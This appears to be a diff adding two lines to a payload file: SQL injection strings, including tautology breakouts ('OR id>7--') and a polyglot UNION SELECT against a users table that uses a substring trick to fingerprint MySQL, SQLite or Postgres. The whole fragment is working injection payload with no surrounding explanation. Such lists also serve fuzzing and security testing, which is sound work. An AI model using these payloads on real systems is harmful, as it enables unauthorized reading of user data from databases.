@@ -1,0 +1,2 @@
+0 OR id>7-- 'OR id>9-- "
+UNION SELECT concat(trim(substr('mysql   sqlite  postgres',1-(-15<<-1)%28,8)),id)FROM users ORDER BY 1 LIMIT 1 OFFSET 3-- 
